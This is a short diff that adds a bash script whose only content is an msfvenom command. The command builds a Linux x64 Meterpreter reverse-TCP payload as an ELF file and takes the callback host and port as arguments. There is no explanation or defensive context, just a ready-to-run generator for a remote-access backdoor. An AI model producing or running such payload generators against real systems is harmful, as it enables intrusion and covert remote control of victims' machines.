@@ -1,0 +1,2 @@
+#!/bin/bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f elf > payload.elf
